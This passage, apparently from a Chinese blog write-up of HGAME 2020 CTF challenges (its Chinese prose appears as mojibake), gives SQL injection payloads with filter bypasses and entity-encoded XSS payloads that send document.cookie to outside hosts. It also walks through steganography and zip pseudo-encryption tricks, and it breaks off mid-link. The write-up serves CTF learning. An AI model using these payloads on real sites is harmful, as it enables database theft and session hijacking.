title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h4><p>é¢˜ç›®æ˜¯å¯ä»¥sqlæ—¶é—´ç›²æ³¨ï¼Œåæ¥çœ‹å®˜æ–¹wpè”åˆæŸ¥è¯¢å°±è¡Œï¼Œé¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œè€Œä¸”å°†<code>select</code>æ›¿æ¢æˆç©º</p><p>è´´ä¸€ä¸‹æˆ‘è„šæœ¬çš„payloadå§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;/**/and/**/if(length(database())=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(i) <span class="comment">#çˆ†å½“å‰æ•°æ®åº“é•¿åº¦</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;/**/and/**/if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(j, k) <span class="comment">#çˆ†å½“å‰æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;/**/and/**/if(ascii(substr((selselectect/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(k , i, j)<span class="comment">#çˆ†æ‰€æœ‰æ•°æ®åº“ï¼Œæ³¨æ„limité‚£é‡Œæ˜¯ä»0å¼€å§‹</span></span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;/**/and/**/if(ascii(substr((selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(k , i, j) <span class="comment">#çˆ†è¡¨</span></span><br><span class="line"></span><br><span class="line">payload5=<span class="string">&#x27;/**/and/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&quot;&#123;&#125;&quot; limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(te,k,i,j) <span class="comment">#çˆ†å­—æ®µ</span></span><br><span class="line"></span><br><span class="line">payload6=<span class="string">&#x27;/**/and/**/if(ascii(substring((seselectlect/**/&#123;&#125;/**/from/**/&#123;&#125;.&#123;&#125;/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;</span>.format(co,db,ta,k,i,j) <span class="comment">#çˆ†å†…å®¹</span></span><br></pre></td></tr></table></figure><p>è”åˆæŸ¥è¯¢çš„payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>database();<span class="comment">#</span></span><br><span class="line"><span class="comment">#å¾—åˆ°æ•°æ®åº“ä¸ºeasysql</span></span><br><span class="line"></span><br><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>group_concat(table_name)<span class="comment">/*1*/</span>from<span class="comment">/*1*/</span>informat</span><br><span class="line">ion_schema.tables<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_schema=&#x27;easysql&#x27;;<span class="comment">#</span></span><br><span class="line"><span class="comment">#å¾—åˆ°æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨å å‘ç°å­˜æ”¾flagçš„è¡¨åä¸ºf1aggggggggggggg</span></span><br><span class="line"></span><br><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>group_concat(column_name)<span class="comment">/*1*/</span>from<span class="comment">/*1*/</span>informa</span><br><span class="line">tion_schema.columns<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_name=&#x27;f1aggggggggggggg&#x27;<span class="comment">/*1*/</span>and<span class="comment">/*1*/</span>tab</span><br><span class="line">le_schema=&#x27;easysql&#x27;;<span class="comment"># </span></span><br><span class="line"><span class="comment">#å¾—åˆ°flagçš„å­—æ®µåä¸ºfl4444444g</span></span><br><span class="line"></span><br><span class="line">&#x27;<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span>fl4444444g<span class="comment">/*1*/</span>from<span class="comment">/*1*/</span>f1aggggggggggggg;<span class="comment">#</span></span><br><span class="line"><span class="comment">#å¾—åˆ°flag</span></span><br></pre></td></tr></table></figure><h4 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h4><p>è¿™é¢˜æ²¡ä»€è«éš¾åº¦ï¼Œå†™è„šæœ¬å°±è¡Œï¼Œä¸è¿‡æˆ‘çš„è„šæœ¬æ˜¯çœŸçš„çƒ‚ï¼Œå‹¿å–·ï¼2333â€¦.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnc</span>(<span class="params">tr</span>):</span></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tr:</span><br><span class="line">f+=chr(ord(i)<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rec</span>(<span class="params">tr</span>):</span></span><br><span class="line"><span class="keyword">return</span> tr[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span>(<span class="params">s, OffSet=<span class="number">13</span></span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span>(<span class="params">ch</span>):</span></span><br><span class="line">         f=<span class="keyword">lambda</span> x: chr((ord(ch)-x+OffSet) % <span class="number">26</span> + x)</span><br><span class="line">         <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64</span>(<span class="params">tr</span>):</span></span><br><span class="line"> <span class="keyword">return</span> str(base64.b64decode(tr.encode()).decode())</span><br><span class="line"> <span class="comment"># return requests.get(&quot;http://127.0.0.1/base64.php?a=&quot;+tr).text</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">met</span>(<span class="params">tr</span>):</span></span><br><span class="line">s=requests.get(<span class="string">&#x27;http://1c75f1a924.php.hgame.n3ko.co/mycode&#x27;</span>)</span><br><span class="line">li=re.findall(<span class="string">r&#x27;echo\(.*\)&#x27;</span>,s.text)[<span class="number">0</span>]</span><br><span class="line">mets=[]</span><br><span class="line">m=[<span class="string">&#x27;str_rot13&#x27;</span>,<span class="string">&#x27;base64_encode&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;strrev&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> li.split(<span class="string">&#x27;(&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span> l <span class="keyword">in</span> m:</span><br><span class="line">mets.append(l)</span><br><span class="line">mets.reverse()</span><br><span class="line">de=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> mets:</span><br><span class="line"><span class="keyword">if</span> j==<span class="string">&quot;base64_encode&quot;</span>:</span><br><span class="line">de+=<span class="string">&#x27;b64(&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j==<span class="string">&quot;str_rot13&quot;</span>:</span><br><span class="line">de+=<span class="string">&quot;rot13(&quot;</span></span><br><span class="line"><span class="keyword">elif</span> j==<span class="string">&quot;strrev&quot;</span>:</span><br><span class="line">de+=<span class="string">&quot;rec(&quot;</span></span><br><span class="line"><span class="keyword">elif</span> j==<span class="string">&quot;encrypt&quot;</span>:</span><br><span class="line">de+=<span class="string">&quot;dnc(&quot;</span></span><br><span class="line">de+=<span class="string">&quot;&#x27;&quot;</span>+tr+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">de+=de.count(<span class="string">&quot;(&quot;</span>)*<span class="string">&quot;)&quot;</span></span><br><span class="line">print(de)</span><br><span class="line"><span class="keyword">return</span> eval(de)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://1c75f1a924.php.hgame.n3ko.co/&#x27;</span></span><br><span class="line">q=requests.session()</span><br><span class="line">r=q.get(url)</span><br><span class="line">r.encoding=<span class="string">&quot;utf-8&quot;</span></span><br><span class="line">tr=str(re.findall(<span class="string">r&#x27;&lt;br&gt;\n(.*)&lt;br&gt;&#x27;</span>,r.text)[<span class="number">-1</span>])</span><br><span class="line">data=&#123;<span class="string">&quot;token&quot;</span>:met(tr)&#125;</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">r=q.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h4 id="Cosmosçš„èŠå¤©å®¤"><a href="#Cosmosçš„èŠå¤©å®¤" class="headerlink" title="Cosmosçš„èŠå¤©å®¤"></a>Cosmosçš„èŠå¤©å®¤</h4><p>æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯xss</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°<code>script</code>æ ‡ç­¾è¿‡æ»¤ï¼Œ<code>&lt;&gt;</code>æœ‰å•åŒå¼•å·é—­åˆä¼šæ›¿æ¢æˆç©ºï¼Œå‘ç°<code>img</code>æ ‡ç­¾å¯ç”¨</p><p>æœ€ç»ˆæ„é€ å‡ºæ¥ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#100;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#117;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#61;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#104;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#98;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#107;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#121;</span><span class="symbol">&amp;#122;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#63;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#43;</span><span class="symbol">&amp;#100;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#117;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#46;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#107;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#101;</span>&quot;</span>#</span></span><br></pre></td></tr></table></figure><p>å®ä½“ç¼–ç ä»£è¡¨çš„æ„æ€æ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.location=<span class="string">&#x27;http://xss.moonback.xyz/?&#x27;</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ—¥å¿—å°±å¯çœ‹åˆ°tokenäº†ï¼Œæœ€å</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200127220928.png" style="zoom: 67%;"><p>å¦å¤–ä¸€ä¸ªpayload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x3d;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x77;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x49;</span><span class="symbol">&amp;#x6d;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x67;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x3d;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x6d;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6b;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x79;</span><span class="symbol">&amp;#x7a;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x3f;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x2b;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6d;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2e;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6b;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x3b;</span>&quot;</span></span></span><br></pre></td></tr></table></figure><p>å®ä½“ç¼–ç æ„æ€</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="keyword">new</span> Image();s.src=<span class="string">&#x27;http://xss.moonback.xyz/?&#x27;</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>å®˜æ–¹çš„writeup:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span></span></span><br><span class="line"><span class="tag">&amp;#<span class="attr">116</span>&amp;#<span class="attr">116</span>&amp;#<span class="attr">112</span>&amp;#<span class="attr">58</span>&amp;#<span class="attr">47</span>&amp;#<span class="attr">47</span>&amp;#<span class="attr">118</span>&amp;#<span class="attr">112</span>&amp;#<span class="attr">115</span>&amp;#<span class="attr">45</span>&amp;#<span class="attr">105</span>&amp;#<span class="attr">112</span>&amp;#<span class="attr">39</span>&amp;#<span class="attr">43</span>&amp;#<span class="attr">100</span>&amp;#<span class="attr">111</span>&amp;#<span class="attr">99</span>&amp;</span></span><br><span class="line"><span class="tag">#<span class="attr">117</span>&amp;#<span class="attr">109</span>&amp;#<span class="attr">101</span>&amp;#<span class="attr">110</span>&amp;#<span class="attr">116</span>&amp;#<span class="attr">46</span>&amp;#<span class="attr">99</span>&amp;#<span class="attr">111</span>&amp;#<span class="attr">111</span>&amp;#<span class="attr">107</span>&amp;#<span class="attr">105</span>&amp;#<span class="attr">101</span>&amp;#<span class="attr">41</span>&amp;#<span class="attr">59</span>&amp;#<span class="attr">47</span>&amp;#<span class="attr">47</span></span></span><br></pre></td></tr></table></figure><p>ç¼–ç å†…çš„å†…å®¹æ˜¯ <code>window.open(&#39;http://vps-ip&#39;+document.cookie);//</code></p><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="Cosmosçš„åˆé¤"><a href="#Cosmosçš„åˆé¤" class="headerlink" title="Cosmosçš„åˆé¤"></a>Cosmosçš„åˆé¤</h4><p>æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶ï¼Œ<code>Capture.pcapng</code>å’Œ<code>ssl_log.log</code></p><p>wiresharkæ‰“å¼€æµé‡åŒ…ï¼Œå°†sslå¯¼å…¥è¿›å»</p><p>å…·ä½“æ“ä½œï¼šç¼–è¾‘-&gt;é¦–é€‰é¡¹-&gt;Protocols-&gt;TLS</p><p>æˆåŠŸå¯¼å…¥ï¼Œå¯¼å‡ºHTTPå¯¹è±¡å‘ç°ï¼Œæœ‰ä¸ªæ–‡ä»¶ç‰¹åˆ«å¤§</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200126161310.png" style="zoom:67%;"><p>å¯¼å‡ºå‘ç°æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—<code>Outguess with key.jpg</code></p><p>ç”±è¿™ä¸ªæ–‡ä»¶åå­—çŒœæµ‹ç”¨Outguesséšå†™çš„ï¼Œåœ°å€ï¼š<a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install outguess<span class="comment">#å®‰è£…</span></span><br><span class="line">outguess -k password -d hinden.txt demo.jpg out.jpg<span class="comment">#åŠ å¯†</span></span><br><span class="line">outguess -k password -r out.jpg hidden.txt<span class="comment">#è§£å¯†</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶å±æ€§æœç„¶æ‰¾åˆ°å¯†ç </p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200126161930.png" style="zoom:50%;"><p>è§£å¯†å‡ºæ¥æ˜¯ä¸ªurlï¼ˆ<a href="https://dwz.cn/69rOREdu">https://dwz.cn/69rOREdu</a>ï¼‰ï¼Œè®¿é—®å‡ºé”™ï¼Œç”¨curlæŸ¥çœ‹</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200126171245.png" style="zoom: 67%;"><p>è®¿é—®æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—flag</p><h4 id="æ‰€è§å³ä¸ºå‡"><a href="#æ‰€è§å³ä¸ºå‡" class="headerlink" title="æ‰€è§å³ä¸ºå‡"></a>æ‰€è§å³ä¸ºå‡</h4><p>é¢˜ç›®æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œ16è¿›åˆ¶æŸ¥çœ‹ï¼Œå‘ç°æ˜¯zipä¼ªåŠ å¯†ï¼Œå³æ ‡å¿—ä½ä¸º<code>14 00 09 00</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200124232355.png" style="zoom: 80%;"><p>å¯ä»¥æ‰‹åŠ¨å°†å…¶æ”¹ä¸º<code>14 00 00 00</code>ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨winraræ¢å¤</p><p>æˆåŠŸè§£å‹åå‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç”¨stringsæŸ¥çœ‹å‘ç°æœ€åæœ‰<code>F5 key</code></p><p>æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°å¯¹åº”çš„å·¥å…·ï¼š<a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200124233102.png" style="zoom:67%;"><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java Extract <span class="number">123456</span>.jpg -p <span class="number">123456</span> -e a.txt #éšå†™è§£å¯†è¾“å‡ºåˆ°a.txt,ä¸åŠ -eä¼šç›´æ¥è¾“å‡ºoutput.txt</span><br><span class="line">java Embed -e <span class="number">1</span>.txt -p <span class="number">123456</span> <span class="number">1</span>.jpg <span class="number">2</span>.jpg #å°†<span class="number">1</span>.txtå†…å®¹éšå†™åˆ°<span class="number">1</span>.jpgè¾“å‡ºä¸º<span class="number">2</span>.jpgï¼Œå¯†ç ä¸º<span class="number">123456</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>output.txt</code>å¾—åˆ°ä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè½¬Asciiå­—ç¬¦å³å¯å¾—åˆ°flag</p><h4 id="åœ°çƒä¸Šæœ€åçš„å¤œæ™š"><a href="#åœ°çƒä¸Šæœ€åçš„å¤œæ™š" class="headerlink" title="åœ°çƒä¸Šæœ€åçš„å¤œæ™š"></a>åœ°çƒä¸Šæœ€åçš„å¤œæ™š</h4><p>é¢˜ç›®è§£å‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œ<code>No password.pdf</code>å’ŒåŠ å¯†çš„<code>Last Evenings on Earth.7z</code></p><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯pdféšå†™ï¼Œå·¥å…·åœ°å€ï¼š<a href="http://wbstego.wbailer.com/">http://wbstego.wbailer.com</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200126144051.png" style="zoom: 80%;"><p>ç›´æ¥ç”¨å·¥å…·ï¼Œå¯†ç è®¾ç½®ä¸ºç©ºï¼Œè·å–éšå†™å†…å®¹å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zip Password: OmR#O12#b3b%s*IW</span><br></pre></td></tr></table></figure><p>è§£å‹å‹ç¼©åŒ…ï¼Œå‘ç°æ˜¯<code>Last Evenings on Earth.docx</code>ï¼Œbinwalkåˆ†ç¦»ï¼Œåœ¨<code>word/secret.xml</code>é‡Œæ‰¾åˆ°flag</p><h4 id="ç©ç©æ¡ç "><a href="#ç©ç©æ¡ç " class="headerlink" title="ç©ç©æ¡ç "></a>ç©ç©æ¡ç </h4><p>â¾¸å…ˆè§£å‹é™„ä»¶ï¼Œå¾—åˆ°<code>7zipPasswordHere.mp4</code>ã€<code>Code128.7z</code>å’Œ<code>JPNPostCode.png</code></p><p>å…ˆçœ‹ä¸‹è¿™ä¸ª<code>JPNPostCode.png</code>ï¼Œé€šè¿‡æ–‡ä»¶åå¯çŸ¥ä¸æ—¥æœ¬é‚®æ”¿æ¡ç ç›¸å…³</p><p>ç¼–ç è§„åˆ™å‚è€ƒèµ„æ–™ï¼š<a href="http://help.seagullscientifific.com/2016/en/Subsystems/Symbology/Content/Japanese_Postal.htm">http://help.seagullscientifific.com/2016/en/Subsystems/Symbology/Content/Japanese_Postal.htm</a></p><p>å¯çœ‹å‡ºï¼Œè¯¥æ¡ç ç”±å››ç§ä¸åŒçš„æ ·å¼ç»„æˆï¼ˆâ»“æ¡ï¼Œä¸Šâ½…åŠâ»“æ¡ï¼Œä¸‹â½…åŠâ»“æ¡ï¼ŒçŸ­æ¡ï¼Œåˆ†åˆ«â½¤1ã€2ã€3ã€4è¡¨</p><p>ç¤ºï¼‰ã€‚æ¡ç ç”±å¼€å§‹æ ‡å¿—ï¼ˆ1 3ï¼‰ã€æ•°å­—éƒ¨åˆ†ï¼ˆæ¯ä¸ªæ•°å­—ç”±ä¸‰ä¸ªâ€œæ¡â€ç»„æˆï¼‰ã€å­—âºŸéƒ¨åˆ†ï¼ˆè‹¥â½†å­—âºŸåˆ™ä½¿â½¤å¡«</p><p>å……ç¬¦å·ï¼Œå¡«å……ç¬¦å·ä¸º4 2 3ï¼‰ã€æ ¡éªŒä½å’Œç»“æŸæ ‡å¿—ç»„æˆ</p><p>å†ç»“åˆå†…å®¹ä¸ºâ€œ0123456789â€çš„æ¡ç  (åœ¨çº¿â½£æˆï¼š<a href="https://barcode.tec-it.com/zh/JapanesePostal?data=">https://barcode.tec-it.com/zh/JapanesePostal?data=</a></p><p>0123456789)ï¼š</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/barcode.gif" style="zoom: 200%;"><p>å¯ä»¥å¾—åˆ°æ•°å­—åŒºåŸŸå¯¹åº”çš„æ¡ç ç¼–ç è§„å¾‹ï¼š</p><p>0ï¼š1 4 4     1ï¼š1 1 4     2ï¼š1 3 2     3ï¼š3 1 2     4ï¼š1 2 3     5ï¼š1 4 1     6ï¼š3 2 1     7ï¼š2 1 3     8ï¼š2 3 1     9ï¼š4 1 1</p><p>éšåæŒ‰ç…§è¿™â¼€è§„å¾‹â½å¯¹é™„ä»¶ä¸­ç»™å‡ºçš„æ¡ç ï¼Œå¯ä»¥è§£å‡ºæ¡ç å†…å®¹ä¸º<code>1087627</code>ï¼ˆç”±äºå­—âºŸåŒºåŸŸå‡ä¸ºå¡«å……ç¬¦</p><p>å·ï¼Œå› æ­¤å¯ä»¥åˆ¤æ–­å‡ºæ²¡æœ‰ä¿¡æ¯å­˜åœ¨ï¼‰</p><p>å†çœ‹ä¸‹<code>7zipPasswordHere.mp4</code>ï¼Œé¢˜ç›®ç»™äº†ä¸¤ä¸ªé“¾æ¥ï¼š</p><p>ã€å‚è€ƒèµ„æ–™1ã€‘ï¼š<a 